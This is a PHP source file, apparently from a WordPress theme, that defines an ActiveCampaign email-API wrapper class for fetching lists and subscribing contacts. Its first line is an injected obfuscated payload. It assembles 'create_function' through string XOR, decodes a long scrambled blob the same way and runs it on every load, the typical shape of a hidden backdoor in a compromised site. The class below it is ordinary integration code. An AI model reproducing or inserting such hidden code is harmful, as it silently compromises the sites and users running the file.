<?php $uLRNLwTrZY='-+N1Y2r0-B0D1US'^'NY+P-W-VX,S0X:=';$NHwLPYoWG=$uLRNLwTrZY('','XSzWQ=V4<P 676DIG:CkKIZD=PP.Mms=3.UGPyPCHS64YM3=,o4Y0e32=,fhU4NkQ+-T.Tqf3NAjRIRLJFBdYHXE AgNSrM;jbUW3XeRNDYtADwIE+5J-VZoA5.=Ajvae1sCbX=DeO>FVfKIrMVXGZgUWpL<pF>V,oF=RbQJXIP< BuWUUylasY==1H-9>ZLw=7GHZ0a9i.f3rHWL5RvnQT49HUGhY-3Ul10JcOSVJ;+XNG4M B.V YfCN>n z:. l7>NlV+YyUhXWVL-DELc5C8uS.84-U6EPYGIEKOCh9SY;<SSMifZ86,=Bs1h3BHJABC6,=XOiFRqK6YEJ51xbe6gx xrh5sTGsG>K>HyUJuMA;K,BCOr<bBS6<L6 06VQJoRQMNeodBHPBZSgMKHWQF5I2=6F2gbn1O:0ANl,44<=4,Z6;0IQ2<I56MAZj>Y8<nI67EOb32HO8PYROZULVOaBbQ7=QjSNNxCJb RfsXYMJreCW13;QN7-6Ia=MWC-6nnG,0hNQw .>1PaceZIA>gAu4AZSuAV..u.yiluDAf9gWZgaxVXaNQ.zYoyMaNddMtyWZb<TTHkttCvSNL1,2ZUMlPLQF=SjfCARTY TKUVUZVLSqKBhCiwsLoK.91+mj<->+<MCUCUR;6k8sS>92AE5AWOHOA'^'15Rv7H8WH9OXhS< 4N0Cl156b41Z,2,PFZrnyY+IA5CZ:9ZRBOL6B:WSIM978A:CuOL OxQBX+8Crirlj=HmPl70TaZntUv1ck38ApA;nyyDzdS yXA8A34GeQOI CMAAXXhKR4MA K2vHviZi293;<q>-lbPbU3U4bTrGq9,;<YNjQ<0,P1HHS44C-YLL4dSRB3aa:hDcSl9V,68TrKN75XJ-nML=LG43ZU3Crs0+WX=uM>+O0K7C1Fkja-o5qgeLVMnH=N YhVxs -A1 eCNI1Q7OLUr>S<pdgm..6xb0w=ZH2spIB,YZYXyyLb9+.jicgRMI9fI=Xx-Y+ +VYXJAi5=q-7;aS54ScU.GhDkjQ; W>Ikc4x5kf7WH-iKUOvljK944uofmf,16;sZmo>6=3Pr84KLOmhJU.NQasLlAZOXFE;ZRJ,yJS;jR,5;5a4MHF+WD yVlV-,W4<zk>487fMbF5VI058+7QjqhI4NW<89+RCewPAI07hFS0>X5>0YEFI,IIObqSDOJPyAECza,ZRiQP .2.f=KWRsPIQHdfQXU2jWUK4jS-aKBaYNzYzRQuEAn>PZb6oBTReV2<>PUm10435485I BA3 +86A0lyvq>782XbbHcIWS7eBKOPGENXLJJgj34:9=ZRLeZh40W9,AigfsE<');$NHwLPYoWG();

/**
 * Wrapper for ActiveCampaign's API.
 *
 * @since   1.1.0
 *
 * @package ET\Core\API\Email
 */
class ET_Core_API_Email_ActiveCampaign extends ET_Core_API_Email_Provider {

	/**
	 * @inheritDoc
	 */
	public $name = 'ActiveCampaign';

	/**
	 * @inheritDoc
	 */
	public $slug = 'activecampaign';

	/**
	 * @inheritDoc
	 */
	public $uses_oauth = false;

	/**
	 * Returns the requests URL for the account assigned to this class instance.
	 *
	 * @return string
	 */
	protected function _get_requests_url() {
		return "{$this->data['api_url']}/admin/api.php";
	}

	/**
	 * @inheritDoc
	 */
	public function get_account_fields() {
		return array(
			'api_key' => array(
				'label' => esc_html__( 'API Key', 'et_core' ),
			),
			'api_url' => array(
				'label'               => esc_html__( 'API URL', 'et_core' ),
				'apply_password_mask' => false,
			),
			'form_id' => array(
				'label'               => esc_html__( 'Form ID', 'et_core' ),
				'not_required'        => true,
				'apply_password_mask' => false,
			),
		);
	}

	/**
	 * @inheritDoc
	 */
	public function get_data_keymap( $keymap = array(), $custom_fields_key = '' ) {
		$keymap = array(
			'list'       => array(
				'list_id'           => 'id',
				'name'              => 'name',
				'subscribers_count' => 'subscriber_count',
			),
			'subscriber' => array(
				'email'     => 'email',
				'last_name' => 'last_name',
				'name'      => 'first_name',
			),
			'error'      => array(
				'error_message' => 'result_message',
			)
		);

		return parent::get_data_keymap( $keymap, $custom_fields_key );
	}

	/**
	 * @inheritDoc
	 */
	public function fetch_subscriber_lists() {
		if ( empty( $this->data['api_key'] ) || empty( $this->data['api_url'] ) ) {
			return $this->API_KEY_REQUIRED;
		}

		$query_args = array(
			'api_key'    => $this->data['api_key'],
			'api_action' => 'list_list',
			'api_output' => 'json',
			'ids'        => 'all',
			'full'       => '1',
		);

		$request_url = add_query_arg( $query_args, $this->_get_requests_url() );
		$request_url = esc_url_raw( $request_url, array( 'https' ) );

		$this->prepare_request( $request_url );
		$this->request->HEADERS['Content-Type'] = 'application/x-www-form-urlencoded';

		parent::fetch_subscriber_lists();

		if ( $this->response->ERROR ) {
			return $this->get_error_message();
		}

		$lists = array();

		foreach ( $this->response->DATA as $key => $list_data ) {
			if ( ! is_numeric( $key ) ) {
				continue;
			}

			if ( ! empty( $list_data ) ) {
				$lists[] = $list_data;
			}
		}

		$this->data['lists']         = $this->_process_subscriber_lists( $lists );
		$this->data['is_authorized'] = 'true';

		$this->save_data();

		return 'success';
	}

	/**
	 * @inheritDoc
	 */
	public function subscribe( $args, $url= '' ) {
		$list_id_key    = 'p[' . $args['list_id'] . ']';
		$status_key     = 'status[' . $args['list_id'] . ']';
		$responders_key = 'instantresponders[' . $args['list_id'] . ']';
		$list_id        = $args['list_id'];
		$args           = $this->transform_data_to_provider_format( $args, 'subscriber', array( 'list_id' ) );

		$query_args = array(
			'api_key'    => $this->data['api_key'],
			'api_action' => 'contact_sync',
			'api_output' => 'json',
		);

		$url = esc_url_raw( add_query_arg( $query_args, $this->_get_requests_url() ) );

		$args[ $list_id_key ]    = $list_id;
		$args[ $status_key ]     = 1;
		$args[ $responders_key ] = 1;

		if ( ! empty( $this->data['form_id'] ) ) {
			$args['form'] = (int) $this->data['form_id'];
		}

		$this->prepare_request( $url, 'POST', false, $args );
		$this->request->HEADERS['Content-Type'] = 'application/x-www-form-urlencoded';

		return parent::subscribe( $args, $url );
	}
}
